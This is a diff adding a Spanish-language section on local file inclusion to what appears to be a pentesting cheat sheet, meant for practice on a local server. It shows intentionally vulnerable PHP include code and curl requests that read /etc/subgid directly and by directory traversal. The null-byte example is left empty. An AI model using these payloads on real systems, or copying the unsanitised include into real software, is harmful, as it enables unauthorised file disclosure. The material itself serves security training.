@@ -2110,7 +2110,85 @@ windows\repair\SAM
 
 A continuación, se detallan algunas vulnerabilidades de tipo **LFI** con el código del lado del servidor, para poder practicar en local dichas técnicas.
 
-##### Basic Includes
+**Basic Includes**
+
+Código del servidor:
+
+```php
+<?php
+$file = $_GET['file'];
+
+if(isset($file))
+{
+  include("$file");
+}
+```
+
+Petición legítima:
+
+```bash
+http://localhost/index.php?file=contact.php
+```
+
+Petición malintencionada:
+
+```bash
+┌─[root@parrot]─[/var/www/html]
+└──╼ #curl --silent http://localhost/index.php?file=/etc/subgid
+s4vitar:100000:65536
+```
+
+**Directory traversal attack**
+
+Código del servidor:
+
+```php
+<?php
+$file = $_GET['file'];
+if(isset($file))
+{
+  include("lib/functions/$file");
+}
+```
+
+Petición legítima:
+
+```bash
+http://localhost/index.php?file=contact.php
+```
+
+Petición malintencionada:
+
+```bash
+┌─[root@parrot]─[/var/www/html]
+└──╼ #curl --silent http://localhost/index.php?file=../../../../../etc/subgid
+s4vitar:100000:65536
+```
+
+**Null Byte Injection**
+
+Código del servidor:
+
+```php
+<?php
+$file = $_GET['file'];
+if(isset($file))
+{
+  include("lib/functions/$file.php");
+}
+```
+
+Petición legítima:
+
+```bash
+http://localhost/index.php?file=contact
+```
+
+Petición malintencionada:
+
+```python
+
+```
 
 
 
